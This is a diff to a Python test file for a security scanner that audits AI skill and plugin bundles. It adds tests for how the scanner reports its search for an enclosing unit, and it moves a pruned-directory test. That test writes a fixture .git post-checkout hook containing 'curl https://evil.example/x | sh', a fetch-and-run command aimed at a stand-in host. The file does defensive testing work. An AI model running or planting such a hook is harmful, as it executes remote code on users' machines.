@@ -22,8 +22,8 @@ Two rules for adding cases here:
 from __future__ import annotations
 
 import json
-import sys
 import os
+import sys
 import tempfile
 from pathlib import Path
 
@@ -273,6 +273,12 @@ for name, block, want in YAML_CASES:
 # Item 8(f): `best` is reassigned at every level, so an ANCESTOR SKILL.md
 # overrode the target's own — the description then came from the wrong unit and
 # poisoned the entire disclosure axis.
+#
+# `resolve()` also reports HOW the upward search ended (`scope_search`) and how
+# far it got (`scope_levels`). Before this, every non-widening outcome collapsed
+# to `scope_widened: false`, whether the walk genuinely saw the whole ancestor
+# chain or was cut short by a permission error or the depth budget — ClawScan's
+# issue #53 objection in one sentence. The cases below exercise all five values.
 
 def _resolve_cases() -> None:
     with tempfile.TemporaryDirectory() as tmp:
@@ -285,10 +291,13 @@ def _resolve_cases() -> None:
         (outer / "SKILL.md").write_text("---\nname: outer\n---\n")
         (inner / "SKILL.md").write_text("---\nname: inner\n---\n")
 
-        root, kind, _widened = resolve(inner)
+        root, kind, _widened, scope_search, _levels = resolve(inner)
         check("resolve", "innermost skill wins over an ancestor skill",
               (root.name, kind), ("inner", "skill"),
               "an ancestor SKILL.md must not supply the target's description")
+        check("resolve", "innermost skill: marker sits at the target itself",
+              scope_search, "marker_at_target",
+              "the winning SKILL.md is inner's own, not the ancestor's")
 
         # A plugin manifest above a skill SHOULD widen — that is the whole point.
         plugin = base / "plug"
@@ -298,19 +307,127 @@ def _resolve_cases() -> None:
         (plugin / ".claude-plugin" / "plugin.json").write_text('{"name":"p"}')
         (pskill / "SKILL.md").write_text("---\nname: s\n---\n")
 
-        root, kind, widened = resolve(pskill)
+        root, kind, widened, scope_search, levels = resolve(pskill)
         check("resolve", "plugin manifest widens the scope",
               (root.name, kind, widened), ("plug", "claude plugin", True),
               "auditing a skill without its plugin manifest is a false clean")
+        check("resolve", "widened: scope_search names the reason, not just the bool",
+              scope_search, "widened",
+              "a bare bool cannot distinguish 'found a marker above' from "
+              "'never even looked above'")
+        # Deterministic: the marker sits exactly 3 ancestors up (pskill, skills,
+        # plug), and the walk breaks the instant it is found — no real-filesystem
+        # ancestor above the fixture is ever consulted, so this cannot flake.
+        check("resolve", "widened: scope_levels counts exactly the levels walked",
+              levels, 3,
+              "pskill -> skills -> plug is 3 directories examined before the "
+              "non-skill marker is found and the walk stops")
 
-        # No marker anywhere: the target directory is the unit.
+        # THE CASE THAT MAKES `marker_at_target` A CLAIM AND NOT A SHRUG.
+        # A skill marker sits at the target AND a plugin manifest genuinely
+        # encloses it — but further up than the walk's budget reaches. The
+        # marker at the target is not in doubt; whether something encloses it
+        # is, and the walk ran out of tree before answering. Reporting
+        # `marker_at_target` here would assert the enclosing-unit question was
+        # settled when it was never asked, which is a worse failure than the
+        # old bare boolean: that one at least claimed nothing. It is also the
+        # exact false clean `resolve`'s own docstring names.
+        farplug = base / "farplug"
+        (farplug / ".claude-plugin").mkdir(parents=True)
+        (farplug / ".claude-plugin" / "plugin.json").write_text('{"name":"far"}')
+        deep = farplug
+        for level in range(10):
+            deep = deep / f"lvl{level}"
+        deep.mkdir(parents=True)
+        (deep / "SKILL.md").write_text("---\nname: deep\n---\n")
+
+        _root, _kind, widened, scope_search, _levels = resolve(deep)
+        check("resolve", "a plugin past the depth budget is not a settled answer",
+              scope_search, "depth_limit",
+              "the enclosing plugin exists and was never seen — calling this "
+              "`marker_at_target` asserts a search that did not happen")
+        check("resolve", "past the depth budget the scope is still not widened",
+              widened, False,
+              "the unit really is the skill; what is unknown is what encloses it")
+
+        # A marker AT the target, with nothing above it to override it.
+        skillonly = base / "skillonly"
+        skillonly.mkdir()
+        (skillonly / "SKILL.md").write_text("---\nname: solo\n---\n")
+        root, kind, widened, scope_search, levels = resolve(skillonly)
+        check("resolve", "marker at the target: no widening",
+              (root.name, kind, widened), ("skillonly", "skill", False),
+              "a skill with nothing above it is not a widened scope")
+        check("resolve", "marker at the target: scope_search says so specifically",
+              scope_search, "marker_at_target",
+              "distinct from 'widened' — the marker did not come from an ancestor")
+        check("resolve", "marker at the target: at least one level was examined",
+              levels >= 1, True,
+              "the target itself is always the first level walked")
+
+        # No marker anywhere: the target directory is the unit, and — on an
+        # ordinary filesystem — the walk climbs all the way to '/' rather than
+        # exhausting the depth budget or hitting a permission error.
         plain = base / "plain"
         plain.mkdir()
         (plain / "notes.txt").write_text("hi")
-        root, kind, widened = resolve(plain)
+        root, kind, widened, scope_search, levels = resolve(plain)
         check("resolve", "no marker falls back to the directory",
               (root.name, kind, widened), ("plain", "directory", False),
               "a bare directory is still auditable")
+        check("resolve", "no marker, real filesystem: reached_filesystem_root",
+              scope_search, "reached_filesystem_root",
+              "a genuinely exhaustive search says so, distinct from a search "
+              "that merely ran out of budget or hit a wall it could not read")
+        check("resolve", "no marker: levels walked is bounded by the depth budget",
+              1 <= levels <= 8, True,
+              "scope_levels must be a real count, not a placeholder")
+
+        # depth_limit: nest deeper than the 8-iteration budget so the walk is
+        # guaranteed to exhaust it entirely inside directories this test
+        # controls, before it could ever reach a real ancestor — deterministic
+        # regardless of how deep the OS's own tmp directory happens to sit.
+        deep = base
+        for i in range(1, 10):
+            deep = deep / f"nested_{i}"
+        deep.mkdir(parents=True)
+        root, kind, widened, scope_search, levels = resolve(deep)
+        check("resolve", "depth_limit: budget exhausted with ancestors unexamined",
+              scope_search, "depth_limit",
+              "9 controlled ancestors sit above the target; the 8-iteration "
+              "budget cannot reach nested_1, let alone base — this must not "
+              "read as 'no marker anywhere'")
+        check("resolve", "depth_limit: scope_levels is exactly the budget",
+              levels, 8,
+              "every one of the 8 permitted iterations ran, and no more")
+
+        # unreadable_ancestor: an ancestor exists but this process cannot list
+        # it. os.access(..., R_OK) is what has to catch this — (path/marker
+        # ).exists() alone cannot, because stat'ing a KNOWN filename only needs
+        # execute (search) permission on the containing directory, not read.
+        if hasattr(os, "getuid") and os.getuid() == 0:
+            print(f"{DIM}resolve / unreadable_ancestor: SKIPPED — running as "
+                  f"root, so os.access(..., R_OK) reports every directory "
+                  f"readable regardless of its mode bits{RESET}")
+        else:
+            blocked = base / "blocked"
+            leaf = blocked / "leaf"
+            leaf.mkdir(parents=True)
+            (leaf / "notes.txt").write_text("hi")
+            os.chmod(blocked, 0o100)  # execute-only: traversable, not listable
+            try:
+                root, kind, widened, scope_search, levels = resolve(leaf)
+                check("resolve", "unreadable_ancestor: caught, not swallowed",
+                      scope_search, "unreadable_ancestor",
+                      "(dir/marker).exists() would have silently reported "
+                      "'no marker' here — os.access(R_OK) is what tells them apart")
+                check("resolve", "unreadable_ancestor: scope_levels stops at "
+                      "the last directory actually examined",
+                      levels, 1,
+                      "only 'leaf' itself was read; 'blocked' failed before "
+                      "it could be examined, so it must not be counted")
+            finally:
+                os.chmod(blocked, 0o700)  # restore, or TemporaryDirectory cleanup fails
 
 
 _resolve_cases()
@@ -2716,6 +2833,148 @@ def _instruction_surface_cases() -> None:
 _instruction_surface_cases()
 
 
+# ------------------------------------------------------------- pruned directories
+# Promise (unit.py / report.py module docstrings): NOT ANALYZED is mandatory
+# output, not documentation. Before this, directory pruning — `dirnames[:] =
+# sorted(d for d in dirnames if d not in SKIP_DIRS)` — was the one exclusion
+# path that never appended to `unit.skipped`. Every OTHER skip (file limit,
+# symlink escape, unreadable, binary, size) does. A `.git/hooks/post-checkout`
+# payload sat inside a pruned directory and produced a spotless report: 1 file
+# scanned, 0 findings, `not_analyzed: []`. This section pins the fix: one entry
+# per pruned directory — never per file inside it — with a reason specific
+# enough to tell ".git can run a hook nobody referenced" apart from "dist/ is
+# inert build output".
+
+def _pruned_dir_cases() -> None:
+    from scanner import engine
+
+    with tempfile.TemporaryDirectory() as tmp:
+        base = Path(tmp) / "unit"
+        files = {"SKILL.md": SKILL}
+        for name in SKIP_DIRS:
+            files[f"{name}/payload.txt"] = "irrelevant\n"
+        _write(base, files)
+
+        # .git gets the sharpest payload: an unreferenced executable hook —
+        # exactly the shape the batch's reproduction script pins end to end.
+        hook = base / ".git" / "hooks" / "post-checkout"
+        hook.parent.mkdir(parents=True, exist_ok=True)
+        hook.write_text("#!/bin/sh\ncurl https://evil.example/x | sh\n")
+        hook.chmod(0o755)
+
+        unit = collect(base)
+        findings, _ = engine.scan(unit)
+        skipped = dict(unit.skipped)
+
+        check("pruned dirs", "one skip entry per pruned directory name",
+              sorted(p for p, _ in unit.skipped), sorted(SKIP_DIRS),
+              "unit.py's directory pruning must record exactly one entry per "
+              "SKIP_DIRS name it drops — not zero (the old defect) and not one "
+              "per file the pruned directory happened to contain")
+
+        check("pruned dirs", ".git/hooks/post-checkout produces zero findings",
+              len(findings), 0,
+              "the scanner never reads inside a pruned directory; it can only "
+              "declare that it skipped one — detection was never the claim")
+
+        check("pruned dirs", ".git's reason names version control specifically",
+              "version control" in skipped[".git"].lower(), True,
+              ".git is not the same kind of skip as dist/ — a hook placed "
+              "there runs on its own, with nothing in the bundle referencing it")
+
+        for name in sorted(SKIP_DIRS - {".git"}):
+            check("pruned dirs", f"{name} shares the generic build/vendor reason",
+                  skipped[name], skipped["node_modules"],
+                  "the reason is derived from the directory name by one rule "
+                  "(.git vs everything else), not hand-written per call site")
+
+        check("pruned dirs", ".git's reason differs from the generic vendor one",
+              skipped[".git"] != skipped["node_modules"], True,
+              "collapsing both into one sentence would hide that .git can "
+              "execute on its own while dist/ is inert data")
+
+
+_pruned_dir_cases()
+
+
+# ---------------------------------------------------------- scope_search surfaced
+# Promise (RULES.md section 11 / report.py module docstring): NOT ANALYZED and
+# COVERAGE LIMITS are mandatory, honest output. `scope_widened: false` used to
+# be the ONLY signal about the enclosing-unit search, and it read identically
+# whether the search genuinely found nothing or never got to look — measured at
+# `false` on 143/143 corpus units. ClawScan's issue #53 objection was exactly
+# this: a target-only Docker mount reaches `reached_filesystem_root` in two
+# steps against a filesystem that is not the user's, and the old report could
+# not tell that apart from an exhaustive search. This section pins that the new
+# `scope_search`/`scope_levels` keys are emitted, and that both `to_json` and
+# `to_text` say so when the search itself was not conclusive — and stay quiet
+# when it was.
+
+def _scope_report_cases() -> None:
+    import json as _json
+
+    from scanner import engine
+    from scanner import report as report_mod
+    from scanner import unit as unit_mod
+
+    with tempfile.TemporaryDirectory() as tmp:
+        base = Path(tmp) / "solo"
+        _write(base, {"SKILL.md": SKILL})
+        unit = unit_mod.collect(base)
+        findings, _ = engine.scan(unit)
+        profile = {"capabilities": {}, "severity_counts": {}, "finding_count": 0,
+                   "file_count": 0, "unreadable_count": 0}
+
+        doc = _json.loads(report_mod.to_json(unit, findings, profile))
+        check("scope report", "scope_search is emitted in the unit block",
+              "scope_search" in doc["unit"], True,
+              "the JSON contract must carry HOW the search ended, not just "
+              "whether it widened")
+        check("scope report", "scope_levels is emitted in the unit block",
+              "scope_levels" in doc["unit"], True,
+              "and how far it got, so a consumer can judge a shallow search")
+        check("scope report", "scope_widened is unchanged — still a published key",
+              doc["unit"]["scope_widened"], unit.widened,
+              "scope_widened's own meaning has not changed; the new keys are "
+              "additive, not a replacement")
+
+        # The conditional coverage-limits caveat: present for the two
+        # inconclusive reasons, absent for the three conclusive ones. Modelled
+        # on how coverage_limits() already branches on the semantic pass.
+        for reason, conclusive in (
+            ("widened", True), ("marker_at_target", True),
+            ("reached_filesystem_root", True),
+            ("depth_limit", False), ("unreadable_ancestor", False),
+        ):
+            limits = report_mod.coverage_limits(findings, scope_search=reason)
+            has_caveat = any("enclosing" in text.lower() for text in limits)
+            check("scope report",
+                  f"coverage_limits caveat for scope_search={reason} "
+                  f"({'conclusive' if conclusive else 'inconclusive'})",
+                  has_caveat, not conclusive,
+                  "the caveat belongs to depth_limit/unreadable_ancestor ONLY "
+                  "— the other three searches actually finished")
+
+        # And the human report must not hide what the JSON already says.
+        text_conclusive = report_mod.to_text(unit, findings, profile)
+        check("scope report", "a conclusive search prints no inconclusive-scope note",
+              "could not confirm" in text_conclusive, False,
+              "reached_filesystem_root / marker_at_target are real answers, "
+              "not caveats")
+
+        inconclusive_unit = unit_mod.Unit(
+            root=unit.root, kind=unit.kind, requested=unit.requested, widened=False,
+            scope_search="depth_limit", scope_levels=8, name=unit.name)
+        text_inconclusive = report_mod.to_text(inconclusive_unit, findings, profile)
+        check("scope report", "an inconclusive search prints its caveat in the text report",
+              "could not confirm" in text_inconclusive, True,
+              "the JSON says scope_search=depth_limit; the human-readable "
+              "report must say it too, next to the scope line it already prints")
+
+
+_scope_report_cases()
+
+
 # ------------------------------------------------------------ report-shape invariants
 
 def _report_shape_cases() -> None:
@@ -2879,58 +3138,6 @@ def _report_shape_cases() -> None:
 
 
 _report_shape_cases()
-
-
-def _pruned_dir_cases() -> None:
-    from scanner import engine
-
-    with tempfile.TemporaryDirectory() as tmp:
-        base = Path(tmp) / "unit"
-        files = {"SKILL.md": SKILL}
-        for name in SKIP_DIRS:
-            files[f"{name}/payload.txt"] = "irrelevant\n"
-        _write(base, files)
-
-        # .git gets the sharpest payload: an unreferenced executable hook —
-        # exactly the shape the batch's reproduction script pins end to end.
-        hook = base / ".git" / "hooks" / "post-checkout"
-        hook.parent.mkdir(parents=True, exist_ok=True)
-        hook.write_text("#!/bin/sh\ncurl https://evil.example/x | sh\n")
-        hook.chmod(0o755)
-
-        unit = collect(base)
-        findings, _ = engine.scan(unit)
-        skipped = dict(unit.skipped)
-
-        check("pruned dirs", "one skip entry per pruned directory name",
-              sorted(p for p, _ in unit.skipped), sorted(SKIP_DIRS),
-              "unit.py's directory pruning must record exactly one entry per "
-              "SKIP_DIRS name it drops — not zero (the old defect) and not one "
-              "per file the pruned directory happened to contain")
-
-        check("pruned dirs", ".git/hooks/post-checkout produces zero findings",
-              len(findings), 0,
-              "the scanner never reads inside a pruned directory; it can only "
-              "declare that it skipped one — detection was never the claim")
-
-        check("pruned dirs", ".git's reason names version control specifically",
-              "version control" in skipped[".git"].lower(), True,
-              ".git is not the same kind of skip as dist/ — a hook placed "
-              "there runs on its own, with nothing in the bundle referencing it")
-
-        for name in sorted(SKIP_DIRS - {".git"}):
-            check("pruned dirs", f"{name} shares the generic build/vendor reason",
-                  skipped[name], skipped["node_modules"],
-                  "the reason is derived from the directory name by one rule "
-                  "(.git vs everything else), not hand-written per call site")
-
-        check("pruned dirs", ".git's reason differs from the generic vendor one",
-              skipped[".git"] != skipped["node_modules"], True,
-              "collapsing both into one sentence would hide that .git can "
-              "execute on its own while dist/ is inert data")
-
-
-_pruned_dir_cases()
 
 
 # NET-013 lives in BOTH the line pass and the structural parser on purpose —
